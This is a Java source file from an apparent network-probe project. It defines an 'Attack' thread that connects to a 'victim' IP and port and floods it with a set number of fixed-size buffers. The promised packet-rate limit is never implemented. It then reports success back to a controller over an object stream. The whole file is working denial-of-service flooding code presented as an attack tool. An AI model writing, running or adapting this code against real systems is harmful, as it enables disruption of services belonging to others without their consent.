/*
 * Attack.java
 *
 * Created on March 21, 2007, 5:56 PM
 *
 * To change this template, choose Tools | Template Manager
 * and open the template in the editor.
 */

package javanetprobe;

/**
 *
 * @author kstse5
 */

import java.io.*;
import java.net.*;
import java.nio.*;
import java.nio.channels.*;
import java.nio.charset.*;
import java.util.*;
import java.util.regex.*;

public class Attack  extends Thread {
    
    //Variable declare:
    private String victimIP = "";
    private int victimPort;
    private int pktRate;
    private int pktNum;
    private int pktSize;
    public static ObjectInputStream input;
    public static ObjectOutputStream output;
    private SocketChannel socketChannel;
    private Socket s;
    
    /** Creates a new instance of Attack */
    public Attack(String victimIP, int victimPort, int pktRate,int pktNum, int pktSize,
            ObjectInputStream input, ObjectOutputStream output) 
    {
       this.victimIP = victimIP;
       this.victimPort = victimPort;
       this.pktRate = pktRate;
       this.pktNum = pktNum;
       this.pktSize = pktSize;  
       this.input = input;
       this.output = output;
    }
    
    public void run()
    {   
        socketChannel = null;
        //Create Socket:
        try{
            
            socketChannel = SocketChannel.open();
            socketChannel.connect(new InetSocketAddress(victimIP, victimPort));
            
            //Retrieve handle to the socket object:
            s = socketChannel.socket();
            ByteBuffer buffer = ByteBuffer.allocateDirect(pktSize);
           
            //*********************************************************************
            //                      Attack start
            //*********************************************************************     
            while (pktNum-- > 0)
            {
                socketChannel.write(buffer);
                //wait with packet rate:
                
                
            }          
            output.writeObject("Packets sent to victim\n");
            output.flush();
         
            
        }catch (IOException x) {
                System.out.print("\nCouldn't get I/O for: " + victimIP + "\n");
		if (socketChannel != null) {
		    try {      
                        output.writeObject("Can't reach victim");
                        output.flush();
                        s.close();
			socketChannel.close();
		    } catch (IOException i) { }
                      catch (NullPointerException n) {}
		}
        }//catch (InterruptedException ie){;}
        try {
            s.close();
            socketChannel.close();
        }catch (IOException e){}
         catch (NullPointerException nullPointerException) {}
    }
    
}
